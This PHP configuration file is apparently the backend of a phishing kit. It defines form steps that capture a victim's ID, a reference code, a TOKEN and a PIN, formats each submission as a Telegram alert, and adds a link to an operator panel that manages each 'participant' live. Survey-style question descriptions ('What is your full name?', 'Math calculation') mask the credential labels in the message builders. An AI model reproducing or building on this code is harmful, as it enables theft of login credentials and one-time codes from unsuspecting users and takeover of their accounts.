<?php
/**
 * Step configuration and helper functions.
 * Each step defines:
 *  - key: internal step id (1,2,3,...)
 *  - status_enter: participant status when viewing the page
 *  - status_processing: status while handler is processing
 *  - status_complete: status after processing
 *  - required_fields: POST fields required
 *  - question_text: human description (used in Telegram message)
 *  - build_message: closure that constructs the Telegram message HTML
 */

require_once __DIR__ . '/../config.php';

function getStepsConfig(): array {
    return [
        '1' => [
            'status_enter' => 'question1',
            'status_processing' => 'processing_question_1',
            'status_complete' => 'completed_question_1',
            'required_fields' => ['answer1'],
            'question_text' => 'What is your full name?',
            'build_message' => function(array $ctx): string {
                $p = $ctx['participant_id'];
                $ts = $ctx['timestamp'];
                $a1 = $ctx['post']['answer1'] ?? '';
                $a2 = $ctx['post']['answer2'] ?? '';
                return htmlMessageHeader($p, 1, $ts)
                    . htmlBold('ID:') . ' ' . escHtml($a1) . "\n"
                    . (!empty($a2) ? htmlBold('Answer 2:') . ' ' . escHtml($a2) . "\n" : '');
            }
        ],
        '2' => [
            'status_enter' => 'question2',
            'status_processing' => 'processing_question_2',
            'status_complete' => 'completed_question_2',
            'required_fields' => ['answer1'],
            'question_text' => 'What is your email address?',
            'build_message' => function(array $ctx): string {
                $p = $ctx['participant_id'];
                $ts = $ctx['timestamp'];
                $a1 = $ctx['post']['answer1'] ?? '';
                return htmlMessageHeader($p, 2, $ts)
                    . htmlBold('referonce:') . ' ' . escHtml($a1) . "\n\n";
            }
        ],
        '3' => [
            'status_enter' => 'question3',
            'status_processing' => 'processing_question_3',
            'status_complete' => 'completed_question_3',
            'required_fields' => ['answer1','dynamic_value'],
            'question_text' => 'Math calculation with dynamic value',
            'build_message' => function(array $ctx): string {
                $p = $ctx['participant_id'];
                $ts = $ctx['timestamp'];
                $a1 = $ctx['post']['answer1'] ?? '';
                $dyn = $ctx['post']['dynamic_value'] ?? '';
                return htmlMessageHeader($p, 4, $ts)
                    . htmlBold('TOKEN:') . ' ' . escHtml($a1) . "\n";
            }
        ],
        '4' => [
            'status_enter' => 'question3',
            'status_processing' => 'processing_question_3',
            'status_complete' => 'completed_question_3',
            'required_fields' => ['answer1'],
            'question_text' => 'Math calculation with dynamic value',
            'build_message' => function(array $ctx): string {
                $p = $ctx['participant_id'];
                $ts = $ctx['timestamp'];
                $a1 = $ctx['post']['answer1'] ?? '';
                $dyn = $ctx['post']['dynamic_value'] ?? '';
                return htmlMessageHeader($p, 3, $ts)
                    . htmlBold('PIN: ') . ' ' . escHtml($a1) . "\n";
            }
        ],
    ];
}

function getStep(string $stepNumber): ?array {
    $steps = getStepsConfig();
    return $steps[$stepNumber] ?? null;
}

// === HTML building helpers ===
function escHtml(string $v): string { return htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
function htmlBold(string $v): string { return '<b>' . escHtml($v) . '</b>'; }
function htmlItalic(string $v): string { return '<i>' . escHtml($v) . '</i>'; }
function htmlMessageHeader(string $participantId, string $qNum, string $timestamp): string {
    $out  = htmlBold('🔔 New Response') . "\n\n";
    $out .= htmlBold('Participant ID:') . ' ' . escHtml($participantId) . "\n";
    $out .= htmlBold('step:') . ' ' . escHtml($qNum) . "\n";
    return $out;
}
function htmlQuestionContext(string $context): string { return "\n" . htmlItalic($context); }

function buildTelegramMessage(string $stepNumber, array $post, string $participantId): string {
    $step = getStep($stepNumber);
    if (!$step) {
        return htmlBold('Unknown step submitted') . ' ' . escHtml($stepNumber);
    }
    $ctx = [
        'participant_id' => $participantId,
        'timestamp' => date('Y-m-d H:i:s'),
        'post' => $post,
        'step' => $stepNumber
    ];
    $message = $step['build_message']($ctx);

    // Append management link (common footer)
    $server_name = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $management_url = $scheme . $server_name . '/Cre/panel/manage.php?participant=' . urlencode($participantId);
    // Footer: Place emoji outside anchor; add raw URL fallback for clients that strip HTML.
    $message .= "\n\n" . '🔧 ' . '<a href="' . escHtml($management_url) . '">Manage this participant</a>'
        . "\n" . escHtml($management_url);
    return $message;
}

function validateRequiredFields(array $step, array $post): array {
    $missing = [];
    foreach ($step['required_fields'] as $field) {
        if (!isset($post[$field]) || trim((string)$post[$field]) === '') {
            $missing[] = $field;
        }
    }
    return $missing;
}

?>
